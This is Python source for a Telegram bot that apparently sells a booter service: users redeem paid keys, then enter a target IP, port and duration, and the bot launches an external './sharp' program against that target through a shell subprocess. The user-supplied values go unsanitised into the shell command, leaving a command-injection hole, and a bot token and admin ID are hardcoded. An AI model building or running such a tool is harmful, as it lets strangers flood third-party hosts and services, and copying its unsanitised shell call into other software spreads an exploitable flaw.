import asyncio
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters

# Global variables to manage attack states and tasks for each user
user_attack_data = {}  # Stores data of current attacks for each user (IP, port, duration)
user_attack_tasks = {}  # Stores asyncio tasks for each user's attack
awaiting_ip = set()  # Tracks users awaiting IP input
awaiting_port = set()  # Tracks users awaiting Port input
valid_keys = set()  # Store valid keys here
users = {}  # Dictionary to store user IDs and their redeemed keys
attack_in_progress = {}  # Flag to manage attack state for each user
keys = {}  # Store generated keys with expiration dates

# Function to add time to the current date
def add_time_to_current_date(hours=0, days=0):
    return datetime.now() + timedelta(hours=hours, days=days)

# Function to generate a unique key
def generate_key(length=7):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# Function to save keys to a file
def save_keys():
    with open('keys.txt', 'w') as f:
        for key, expiration_date in keys.items():
            f.write(f"{key}:{expiration_date}\n")

# Start command with a request to join a channel
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    message = (
        f"🔗 *𝖏𝖔𝖎𝖓 𝕺𝖚𝖗 𝕮𝖍𝖆𝖓𝖓𝖊𝖑* 𝘵𝘰 𝘨𝘦𝘵 𝘈𝘤𝘤𝘦𝘴𝘴 𝘵𝘰 𝘍𝘦𝘢𝘵𝘶𝘳𝘦:\n\n"
        f"👉 [Click Here to Join](https://t.me/{CHANNEL_USERNAME})\n"
        "After joining the channel, click 'I Have Joined' to proceed."
    )
    
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME}")],
        [InlineKeyboardButton("✅ I Have Joined", callback_data="joined")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown', reply_markup=reply_markup)

# Handle the "I Have Joined" button click
async def handle_joined(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()

    # Show Generate Key, Redeem Key, and Already Approved buttons
    keyboard = [
        [InlineKeyboardButton("🔑 gєηяαтє kєy", callback_data="genkey")],
        [InlineKeyboardButton("🗝️ яє∂єєм kєy", callback_data="redeem_key")],
        [InlineKeyboardButton("✅ ɑlreɑdy ɑppeɑred", callback_data="already_approved")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(query.from_user.id, text="Select an option:", reply_markup=reply_markup)

# Generate key command for admins
async def genkey(update: Update, context: CallbackContext):
    if update.callback_query:  # Check if called from a button click
        query = update.callback_query
        await query.answer()
        user_id = str(query.from_user.id)

        if user_id in ADMIN_IDS:
            await context.bot.send_message(user_id, "/genkey <99> <days>")
        else:
            await context.bot.send_message(user_id, "ꮎꮑꮮꮍ ꮎꮃꮑꭼꭱ ꮯꭺꮑ ꮜꮪꭼ💀ꮎꮃꮑꭼꭱ ꮖꮪ 👉 @thugh_army")
    else:  # Handle the command case
        command = context.args
        user_id = str(update.message.from_user.id)

        if user_id in ADMIN_IDS:
            if len(command) == 2:
                try:
                    time_amount = int(command[0])
                    time_unit = command[1].lower()
                    if time_unit == 'hours':
                        expiration_date = add_time_to_current_date(hours=time_amount)
                    elif time_unit == 'days':
                        expiration_date = add_time_to_current_date(days=time_amount)
                    else:
                        raise ValueError("Invalid time unit")
                    key = generate_key()
                    keys[key] = expiration_date
                    save_keys()
                    response = f"ꮶ⃞ꭼ⃞ꮍ⃞🗝⃒️⃒: {key}\nExpires on: {expiration_date}"
                except ValueError:
                    response = "Please specify a valid number and unit of time (hours/days)."
            else:
                response = "Usage: /genkey <amount> <hours/days>"
        else:
            response = "ꮎꮑꮮꮍ ꮎꮃꮑꭼꭱ ꮯꭺꮑ ꮜꮪꭼ💀ꮎꮃꮑꭼꭱ ꮖꮪ 👉 @thugh_army"

        await update.message.reply_text(response)

# Handle redeeming key functionality
async def handle_redeem_key(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    await context.bot.send_message(query.from_user.id, "Please enter your key in the format: `/redeem <key>`")

# Redeem key functionality
async def redeem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if not args or len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Invalid command format.* Use `/redeem <key>`.", parse_mode='Markdown')
        return

    key = args[0]

    if key in keys:
        if user_id not in users:
            users[user_id] = key
            del keys[key]  # Remove the key from valid keys
            save_keys()
            await context.bot.send_message(chat_id=chat_id, text="✅ *ꮯ⃑ꮋ⃑ꭺ⃑ꮮ⃑ ꮟ⃑ꮪ⃑ꭰ⃑ꮶ⃑ ꮶ⃑ꭼ⃑ꮍ⃑ 🗝⃑️⃑ ꮮ⃑ꭺ⃑ꮐ⃑ ꮐ⃑ꮍ⃑ꭺ⃑ ꭺ⃑ꮟ⃑ ꭼ⃑ꮑ⃑ꭻ⃑ꮎ⃑ꮍ⃑ ꮶ⃑ꭱ⃑* ꮯ⃑ꮋ⃑ꭺ⃑ꮮ⃑ ꮟ⃑ꮎ⃑ꭲ⃑ ꭺ⃑ꮟ⃑ ꭲ⃑ꭼ⃑ꭱ⃑ꭼ⃑ ꭺ⃑ꮯ⃑ꮯ⃑ꭼ⃑ꮪ⃑ꮪ⃑ ꮇ⃑ꭼ⃑ ꮋ⃑ 𝗞𝗥𝗔𝗙𝗧𝗢𝗡 ꮶ⃑ꮖ⃑ ꮇ⃑ꭺ⃑ꭺ⃑ ꮯ⃑ꮋ⃑ꮎ⃑ꭰ⃑ ꭰ⃑ꮎ⃑.", parse_mode='Markdown')
            
            # After redeeming, show all available buttons
            await show_all_buttons(chat_id, context)  # Pass context here
        else:
            await show_all_buttons(chat_id, context)  # Show buttons if already redeemed
    else:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Invalid or already redeemed key.*", parse_mode='Markdown')

# Show all available buttons after redeeming a key
async def show_all_buttons(chat_id, context):
    keyboard = [
        [InlineKeyboardButton("🔑 gєηяαтє kєy", callback_data="genkey")],
        [InlineKeyboardButton("🗝️ яє∂єєм kєy", callback_data="redeem_key")],
        [InlineKeyboardButton("✅ ɑlreɑdy ɑppeɑred", callback_data="already_approved")],
        [InlineKeyboardButton("⚙️ ɑutomɑtic Mod", callback_data="automatic_mode")],
        [InlineKeyboardButton("🔧 Mɑnuɑlly Mod", callback_data="manual_mode")],
        [InlineKeyboardButton("✅ 𝑆𝑇𝐴𝑅𝑇 𝐴𝑇𝑇𝐴𝐶𝐾", callback_data="start_attack")],
        [InlineKeyboardButton("🛑 𝑆𝑇𝑂𝑃 𝐴𝑇𝑇𝐴𝐶𝐾", callback_data="stop_attack")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(chat_id=chat_id, text="You have redeemed your key! Here are your options:", reply_markup=reply_markup)

# Handle Already Approved button
async def handle_already_approved(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)

    if user_id in users:  # Check if the user has already redeemed a key
        await show_all_buttons(user_id, context)  # Show all buttons
    else:
        await context.bot.send_message(user_id, "❌ *You have not redeemed a key yet!* Please redeem a key first.")

# Handle Manual Mode button
async def manual_mode(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    await context.bot.send_message(chat_id=chat_id, text="Please send your attack in this format: `/attack <ip> <port> <duration>`")

# Handle Automatic Mode button
async def automatic_mode(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    awaiting_ip.add(user_id)
    await context.bot.send_message(chat_id=chat_id, text="💻 Please provide your target IP address:")

# Handle the `/attack` command for manual mode input
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Access Denied* – You need to redeem a valid key to use this bot. Please use `/redeem <key>` to get started.", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Invalid Command Format* – Correct usage: `/attack <ip> <port> <duration>`", parse_mode='Markdown')
        return

    ip, port, duration = args
    user_attack_data[user_id] = {'ip': ip, 'port': port, 'duration': duration}

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"🔒 *Preparing to Launch Attack!* 🔒\n\n"
        f"📡 *Target IP*: `{ip}`\n"
        f"⚙️ *Target Port*: `{port}`\n"
        f"⏳ *Duration*: `{duration} seconds`\n\n"
        "🔥 *The attack is about to start. Brace yourself!* 🔥"
    ), parse_mode='Markdown')

    # Start the attack in a separate task
    user_attack_tasks[user_id] = asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

    # Show Start and Stop buttons after attack starts
    keyboard = [
        [InlineKeyboardButton("✅ Start Attack", callback_data="start_attack")],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(chat_id=chat_id, text="Choose an option:", reply_markup=reply_markup)

# Run the attack using an external command
async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    if chat_id in attack_in_progress and attack_in_progress[chat_id]:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Another attack is already in progress. Please wait.")
        return

    attack_in_progress[chat_id] = True

    try:
        # Execute the external command here
        process = await asyncio.create_subprocess_shell(
            f"./sharp {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        # Check and send output to Telegram
        if stdout:
            await context.bot.send_message(chat_id=chat_id, text=f"🔊 Output:\n{stdout.decode()}")
        if stderr:
            await context.bot.send_message(chat_id=chat_id, text=f"❌ Error:\n{stderr.decode()}")

        await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Successfully Completed!* 🎉")
        
        # Show action buttons again after attack is completed
        await show_all_buttons(chat_id, context)  # Pass context here

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ Error during the attack: {str(e)}")

    finally:
        attack_in_progress[chat_id] = False

# Handle Start and Stop buttons for attack
async def handle_attack_control(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat.id
    user_id = str(query.from_user.id)

    if query.data == "start_attack":
        if user_id in user_attack_data:
            # Logic to start the attack again if it's not already running
            await context.bot.send_message(chat_id=chat_id, text="✅ Starting the attack again...")
            # Logic to start the attack, requires IP, port, and duration
            ip = user_attack_data[user_id]['ip']
            port = user_attack_data[user_id]['port']
            duration = user_attack_data[user_id]['duration']
            user_attack_tasks[user_id] = asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
        else:
            await context.bot.send_message(chat_id=chat_id, text="⚠️ You need to start an attack first.")

    elif query.data == "stop_attack":
        await context.bot.send_message(chat_id=chat_id, text="🛑 Stopping the attack...")
        if user_id in user_attack_tasks and not user_attack_tasks[user_id].done():
            user_attack_tasks[user_id].cancel()
            await context.bot.send_message(chat_id=chat_id, text="✅ Attack has been stopped.")
        else:
            await context.bot.send_message(chat_id=chat_id, text="⚠️ No attack is currently running.")

# Handle message input for IP address in Automatic Mode
async def handle_ip_input(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if user_id in awaiting_ip:
        ip = update.message.text
        user_attack_data[user_id] = {'ip': ip}
        awaiting_ip.remove(user_id)
        awaiting_port.add(user_id)
        await context.bot.send_message(chat_id=chat_id, text="🔧 Please provide the target port:")
    elif user_id in awaiting_port:
        port = update.message.text
        user_attack_data[user_id]['port'] = port
        awaiting_port.remove(user_id)
        # Show timing buttons after port is provided
        keyboard = [
            [InlineKeyboardButton("⏱️ 60 seconds", callback_data="duration_60")],
            [InlineKeyboardButton("⏱️ 120 seconds", callback_data="duration_120")],
            [InlineKeyboardButton("⏱️ 600 seconds", callback_data="duration_600")],
            [InlineKeyboardButton("⏱️ 1200 seconds", callback_data="duration_1200")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=chat_id, text="⏳ Please select the attack duration:", reply_markup=reply_markup)

# Handle timing selection and start the attack in automatic mode
async def handle_time_selection(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat.id
    duration_map = {
        "duration_60": 60,
        "duration_120": 120,
        "duration_600": 600,
        "duration_1200": 1200
    }

    selected_duration = query.data
    duration = duration_map.get(selected_duration)
    if duration is None:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Invalid duration selected.*")
        return

    ip = user_attack_data[user_id]['ip']
    port = user_attack_data[user_id]['port']
    user_attack_data[user_id]['duration'] = duration

    await context.bot.send_message(chat_id=chat_id, text=f"🚀 Starting attack on {ip}:{port} for {duration} seconds...")
    user_attack_tasks[user_id] = asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

# Main function
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("redeem", redeem))  # Redeem key command
    application.add_handler(CommandHandler("genkey", genkey))  # Admin genkey command

    # Message Handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ip_input))  # Handle IP and Port inputs in automatic mode

    # Callback Query Handlers
    application.add_handler(CallbackQueryHandler(handle_joined, pattern="^joined$"))  # Handle the "I Have Joined" click
    application.add_handler(CallbackQueryHandler(handle_redeem_key, pattern="^redeem_key$"))
    application.add_handler(CallbackQueryHandler(genkey, pattern="^genkey$"))  # Handle Generate Key button click
    application.add_handler(CallbackQueryHandler(manual_mode, pattern="^manual_mode$"))
    application.add_handler(CallbackQueryHandler(automatic_mode, pattern="^automatic_mode$"))
    application.add_handler(CallbackQueryHandler(handle_time_selection, pattern="^duration_.*$"))
    application.add_handler(CallbackQueryHandler(handle_attack_control, pattern="^(start_attack|stop_attack)$"))  # New handler for start/stop buttons
    application.add_handler(CallbackQueryHandler(handle_already_approved, pattern="^already_approved$"))  # New handler for already approved button

    application.run_polling()

# Bot token and user/channel details
BOT_TOKEN = '7676922490:AAFHkXa6q3oyxXjozk5viXQ52AqnPDHD9PU'
CHANNEL_USERNAME = 'THUGHARMY'
ADMIN_IDS = ['6066597118']  # Admin user IDs

if __name__ == '__main__':
    main()
